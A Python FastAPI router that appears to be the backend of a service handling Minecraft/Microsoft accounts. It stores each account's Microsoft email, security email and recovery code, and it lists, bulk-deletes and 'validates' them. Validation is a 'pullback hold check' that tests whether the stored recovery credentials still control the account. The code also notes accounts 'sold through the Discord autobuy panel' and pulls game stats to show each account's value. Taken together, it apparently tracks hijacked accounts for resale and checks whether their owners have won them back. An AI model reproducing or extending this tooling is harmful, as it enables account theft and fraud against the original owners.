from minecraft.get_hypixel import get_hypixel_stats
from minecraft.get_donut import get_donut_stats

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel, Field
from database.database import DBConnection
from web.config import require_auth
from datetime import datetime
import json
import time
import logging

router = APIRouter()
log = logging.getLogger(__name__)


class BulkDeleteRequest(BaseModel):
    account_ids: list[str] = Field(default_factory=list)


class ValidateRequest(BaseModel):
    account_ids: list[str] = Field(default_factory=list)


def _usable_rc(value: str | None) -> str | None:
    rc = (value or "").strip().upper().replace(" ", "")
    if not rc or rc in (
        "INVALID",
        "COULDN'T CHANGE!",
        "COULDNT CHANGE!",
        "N/A",
        "UNKNOWN",
        "FAILED TO GENERATE",
    ):
        return None
    compact = rc.replace("-", "")
    if len(compact) < 20:
        return None
    return rc


async def _validate_one_account(row: dict) -> dict:
    """RC-first validation — same workflow as autobuy pullback hold check.

    Never changes credentials. Never password-checks (locks / rate-limits).

    status: valid | partial | invalid | locked | unknown
    """
    account_id = row["account_id"]
    email = (row.get("ms_email") or "").strip()
    sec = (row.get("ms_security_email") or "").strip()
    rc = _usable_rc(row.get("ms_recovery_code"))

    from securing.auth.account_status import get_account_lock_reason
    from securing.autobuy_hold_check import check_pullback_intact

    if not email:
        return {
            "account_id": account_id,
            "status": "invalid",
            "detail": "Missing Microsoft email",
            "rc_ok": False,
            "email_ok": False,
            "locked": False,
        }

    try:
        lock_reason = await get_account_lock_reason(email)
    except Exception as exc:
        log.warning("lock check failed for %s: %s", email, exc)
        lock_reason = None

    if lock_reason:
        return {
            "account_id": account_id,
            "status": "locked",
            "detail": lock_reason,
            "rc_ok": None,
            "email_ok": None,
            "locked": True,
        }

    try:
        status, detail = await check_pullback_intact(
            email,
            recovery_code=rc,
            expected_security_email=sec,
        )
    except Exception as exc:
        log.exception("validation crashed for %s", email)
        return {
            "account_id": account_id,
            "status": "unknown",
            "detail": f"Validation error ({exc.__class__.__name__})",
            "rc_ok": None,
            "email_ok": None,
            "locked": False,
        }

    if status == "ok":
        return {
            "account_id": account_id,
            "status": "valid",
            "detail": detail or "Recovery code valid",
            "rc_ok": True,
            "email_ok": None,
            "locked": False,
        }
    if status == "partial":
        return {
            "account_id": account_id,
            "status": "partial",
            "detail": detail or "Recovery code invalid; security email still present",
            "rc_ok": False if rc else None,
            "email_ok": True,
            "locked": False,
        }
    if status == "unknown":
        return {
            "account_id": account_id,
            "status": "unknown",
            "detail": detail or "Validation inconclusive",
            "rc_ok": None,
            "email_ok": None,
            "locked": False,
        }
    return {
        "account_id": account_id,
        "status": "invalid",
        "detail": detail or "Recovery code and security email both failed",
        "rc_ok": False if rc else None,
        "email_ok": False,
        "locked": False,
    }


@router.get("/api/accounts")
def accounts(user: str = Depends(require_auth)):
    with DBConnection() as db:
        return db.get_all_secured_accounts()


@router.get("/api/accounts/autobuy")
def autobuy_accounts(user: str = Depends(require_auth)):
    """Accounts sold through the Discord autobuy panel."""
    with DBConnection() as db:
        return db.get_autobuy_secured_accounts()


@router.post("/api/accounts/bulk-delete")
def bulk_delete_accounts(body: BulkDeleteRequest, user: str = Depends(require_auth)):
    ids = [aid.strip() for aid in body.account_ids if aid and aid.strip()]
    if not ids:
        raise HTTPException(400, detail="No account IDs provided.")
    with DBConnection() as db:
        deleted = db.delete_secured_accounts(ids)
        return {"ok": True, "deleted": deleted}


@router.post("/api/accounts/validate")
async def validate_accounts(body: ValidateRequest, user: str = Depends(require_auth)):
    """Check RecoveryCode (read-only), then security email if RC fails.

    Marks each account: valid | partial | invalid | locked | unknown
    """
    ids = [aid.strip() for aid in body.account_ids if aid and aid.strip()]
    if not ids:
        raise HTTPException(400, detail="No account IDs provided.")
    if len(ids) > 25:
        raise HTTPException(400, detail="Max 25 accounts per validate request.")

    results: list[dict] = []
    rows = []
    with DBConnection() as db:
        for aid in ids:
            row = db.get_secured_account(aid)
            if not row:
                results.append(
                    {
                        "account_id": aid,
                        "status": "invalid",
                        "detail": "Account not found",
                        "rc_ok": False,
                        "email_ok": False,
                        "locked": False,
                    }
                )
                continue
            rows.append(row)

    for row in rows:
        result = await _validate_one_account(row)
        if result["status"] != "unknown":
            with DBConnection() as db:
                db.set_account_validation(
                    result["account_id"],
                    result["status"],
                    result.get("detail"),
                )
        results.append(result)

    return {"ok": True, "results": results}


@router.get("/api/accounts/{account_id}")
def account_detail(account_id: str, user: str = Depends(require_auth)):
    with DBConnection() as db:
        row = db.get_secured_account(account_id)
        if not row:
            raise HTTPException(404, detail="Account not found.")

        return row


@router.delete("/api/accounts/{account_id}")
def delete_account(account_id: str, user: str = Depends(require_auth)):
    with DBConnection() as db:
        if not db.delete_secured_account(account_id):
            raise HTTPException(404, detail="Account not found.")
        return {"ok": True}


@router.get("/api/accounts/{account_id}/stats")
async def account_stats(account_id: str, user: str = Depends(require_auth)):
    with DBConnection() as db:
        account = db.get_secured_account(account_id)
        if not account:
            raise HTTPException(404, detail="Account not found.")

        mc_name = account["mc_name"]
        has_minecraft = (mc_name != "No Minecraft")
        stats = db.get_stats_for_account(account_id)

        def check_stats(game_stats):
            last_updated = datetime.strptime(game_stats["last_updated"], "%Y-%m-%d %H:%M:%S")
            age_seconds = time.time() - last_updated.timestamp()
            return age_seconds < 3600

        stats_payload = {}

        for game, fetch_stats in [("hypixel", get_hypixel_stats), ("donut", get_donut_stats)]:
            if game in stats and check_stats(stats[game]):
                stats_payload[game] = stats[game]["stats"]
            elif has_minecraft:
                nstats = await fetch_stats(mc_name)
                stats_payload[game] = nstats
                db.save_stats(account_id, mc_name, game, json.dumps(nstats))

        return {
            "mc_name": mc_name,
            "stats": stats_payload
        }
